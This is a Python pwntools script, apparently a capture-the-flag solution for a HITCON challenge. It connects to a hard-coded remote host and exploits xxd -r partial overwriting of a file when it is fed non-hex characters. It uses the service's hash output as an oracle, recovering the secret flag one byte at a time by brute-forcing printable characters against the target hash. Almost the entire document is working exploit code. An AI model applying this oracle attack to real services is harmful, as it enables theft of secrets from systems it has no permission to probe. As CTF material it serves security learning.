"""
The overall idea of the exploit is that if we send non-hex characters to xxd,
then xxd will not overwrite the rest of the file, so we can keep on trying
prefixes by partial overwriting the flag, and if they hash to the same thing
as the flag then that must be the prefix of the flag.  Go byte-by-byte until
we recovered the full thing.
"""

from pwn import *

r = remote("13.113.205.160", 21700)

# write the flag into our file
r.sendlineafter(b"quit\n", "1337")
# read the hash of the flag
r.sendlineafter(b"quit\n", "2")
target = r.recvuntil("\n")
print("TARGET")
print(target)

# we know the flag starts with "hitcon"
known = b"hitcon"

import binascii
import string

while True:
	pre = len(known)
	print(known)
	# check every potential next printable character in the flag for if it yields
	# the target hash (i.e. we have a correct prefix to flag)
	for potential in bytes(string.printable, "utf-8"):
		# for some reason, xxd -r partial overwrites if you throw
		# non-hex characters at the end of your input, so we partial
		# overwrite with every possible beginning byte then check
		# the hash
		trial = binascii.hexlify(known + bytes([potential])) + b"........"
		r.sendline("1")
		r.sendline(trial)
		r.sendline("2")
	for potential in bytes(string.printable, "utf-8"):
		r.recvuntil(b"quit\n")
		r.recvuntil("format)\n")
		r.recvuntil(b"quit\n")
		result = r.recvuntil("\n")
		print(result)
		if result == target:
			print("GOT ONE:")
			known += bytes([potential])
	if pre == len(known):
		# if we didn't add something to our known prefix, then we
		# have the entire flag
		break

print(known)

